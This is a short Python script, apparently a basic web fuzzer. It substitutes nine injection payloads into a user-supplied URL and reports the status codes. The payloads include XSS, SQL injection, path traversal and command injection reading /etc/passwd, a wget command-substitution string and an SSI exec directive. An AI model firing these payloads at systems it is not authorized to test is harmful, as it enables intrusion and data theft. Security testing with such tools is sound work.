import time
import requests

array_injections = ['0x200', "<script>alert('hacked')</script>", '../../etc/passwd',
    '; cat /etc/passwd', "$(`echo(wget http://google.com)`)", "' OR 'a'='a",
    '*/*', "') or (SELECT admin FROM users WHERE admin = true AND ''='",
    '<!--#exec cmd="ls ../"-->']

end_point = input('[!] Please provide an endpoint \
(Please mark your entry Ex: http://myvulnsite.com/index.php?id=[]): ')

request_type = input('[!] GET, POST, PUT, DELETE? ')

# Add Option to choose types of injections
# Add for authorization if needed

for arr in array_injections:
    try:
        time.sleep(2)

        if '[]' in end_point:
            new_ep = end_point.replace('[]', arr)

            if request_type == 'GET' or request_type == 'get':
                r = requests.get(new_ep)
            elif request_type == 'POST' or request_type == 'post':
                r = requests.post(new_ep)
            elif request_type == 'PUT' or request_type == 'put':
                r = requests.put(new_ep)
            elif request_type == 'DEL' or request_type == 'del':
                r = requests.delete(new_ep)
            else:
                print('\n[-] Not a valid request type.')
                break

            print('\n[+] Fuzzing... {0}'.format(new_ep))
            print('[+] Request Type: {0}\t Status Code: {1}'.format(request_type,
                                                                r.status_code))

        else:
            print('\n[-] Not fuzzable.')
            break

    except:
        print('\n[-] Could not make a successful request to that endpoint.')
        break
